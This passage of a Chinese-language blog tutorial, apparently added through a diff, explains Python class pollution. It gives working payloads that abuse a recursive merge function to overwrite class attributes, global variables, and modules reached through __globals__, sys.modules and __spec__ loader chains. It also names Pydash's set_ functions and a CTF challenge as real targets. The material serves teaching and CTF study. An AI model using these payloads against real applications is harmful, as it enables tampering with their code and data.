instance)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="无法污染的Object"><a href="#无法污染的Object" class="headerlink" title="无法污染的Object"></a>无法污染的<code>Object</code></h3><p>正如前面所述，并不是所有的类的属性都可以被污染，如<code>Object</code>的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="更广泛的获取"><a href="#更广泛的获取" class="headerlink" title="更广泛的获取"></a>更广泛的获取</h3><p>在代码展示部分所给出的例子中，污染类属性是通过示例的<code>__base__</code>属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力</p>
+<h4 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h4><p>在<code>Python</code>中，函数或类方法（对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即<code>wrapper_descriptor</code>，只有在重写后才是函数<code>function</code>）均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的<code>globals</code>函数的返回值）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.__globals__ == <span class="built_in">globals</span>() == a.__init__.__globals__)</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>所以我们可以使用<code>__globlasl__</code>来获取到全局变量，这样就可以修改无继承关系的类属性甚至全局变量</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;cirno&quot;</span>,</span><br><span class="line">            <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment"># cirno</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="已加载模块获取"><a href="#已加载模块获取" class="headerlink" title="已加载模块获取"></a>已加载模块获取</h4><p>局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p>
+<h5 id="加载关系简单"><a href="#加载关系简单" class="headerlink" title="加载关系简单"></a>加载关系简单</h5><p>在加载关系简单的情况下，我们可以直接从文件的<code>import</code>语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块。</p>
+<p>我们可以通过当前文件中的类获取 globals 里的内容，import进来的模块也可以直接访问和修改。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;koishi&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># ori_secret_class</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>test.py</strong></p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;ori_secret_class&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="加载关系复杂-示例"><a href="#加载关系复杂-示例" class="headerlink" title="加载关系复杂-示例"></a>加载关系复杂-示例</h5><p>如<code>CTF</code>题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中<code>import</code>语法查找就十分困难，而解决方法则是利用<code>sys</code>模块</p>
+<p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;koishi&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># ori_secret_class</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>test.py</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;ori_secret_class&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>如上的<code>Payload</code>实际上是在已经<code>import sys</code>的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找<code>import</code>特定模块的语句</strong>转换为<strong>寻找<code>import</code>了sys模块的语句</strong>，对问题解决的并不见得有多少优化。</p>
+<h5 id="加载关系复杂-实际使用"><a href="#加载关系复杂-实际使用" class="headerlink" title="加载关系复杂-实际使用"></a>加载关系复杂-实际使用</h5><p>为了进一步优化，这里采用方式是利用<code>Python</code>中加载器<code>loader</code>，在官方文档中给出的定义是：</p>
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127104647995-145728452.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104647995-145728452.png"
+                      alt="img"
+                ></a></p>
+<p>简单来说就是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。令人庆幸的是<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.__init__&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap_external&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._common&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.abc&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.machinery&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.metadata&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.resources&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.util&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure></div>
+
+<p>所以只要我们能过获取到一个<code>loader</code>便能用如<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式拿到<code>sys</code>模块，这样进而获取目标模块。</p>
+<p>那<code>loader</code>好获取吗？答案是肯定的。依据官方文档的说明，对于一个模块来说，模块中的一些内置属性会在被加载时自动填充：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104705262-1430214027.png"
+                      alt="img"
+                ></p>
+<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104721104-1224559985.png"
+                      alt="img"
+                ></p>
+<p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
+<p>由于<code>ModuleSpec</code>的属性值设置，相对于上面的获取方式，还有一种相对长的<code>payload</code>的获取方式，主要是利用<code>ModuleSpec</code>中的<code>loader</code>属性。如属性名所示，该属性的值是模块加载时所用的<code>loader</code>，在源码中如下所示：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104734758-865825998.png"
+                      alt="img"
+                ></p>
+<p>所以有这样的相对长的<code>Payload</code>：<code>&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#39;sys&#39;]</code></p>
+<h3 id="实际环境中的合并函数"><a href="#实际环境中的合并函数" class="headerlink" title="实际环境中的合并函数"></a>实际环境中的合并函数</h3><p>目前发现了<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数具有如上实例中<code>merge</code>函数类似的类属性赋值逻辑，能够实现污染攻击。<code>idekctf 2022*</code>中的<code>task manager</code>这题就设计使用该函数提供可以污染的环境</p>
+<h2 id="攻击面扩展"><a href="#攻击面扩展" class="headerlink" title="攻击面扩展"></a>攻击面扩展</h2><h3 id="替换函数形参默认值"><a href="#替换函数形参默认值" class="headerlink" title="替换函数形参默认值"></a>替换函数形参默认值</h3><p>主要用到了函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/2293037-20230127104748903-1502385594.png"
+                      alt="img"
+                ></p>
+<h4 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h4><p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的<strong>一类</strong>形参（也就是要么是位置参数，要么是关键字参数），<strong>并不是位置形参+键值形参</strong>（由于位置参数必须在关键字参数的前面，又由于是从左向右读取的，所以<strong>只要有一个位置参数有默认值，那么只会获取到位置参数的默认值</strong>），关于函数的参数分类可以参考学习过后记录的这篇文章：</p>
+<p><a class="link"   href="file://python函数的位置参数(Positional)和关键字参数(keyword).md" >python函数的位置参数(Positional)和关键字参数(keyword) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>从代码上来看，则是如下的效果：</p>
+<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment"># (2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment"># (2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment"># (2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment"># (2,)</span></span><br></pre></td></tr></table></figure></div>
+
+<p>通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如<code>JSON</code>等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式。</p>
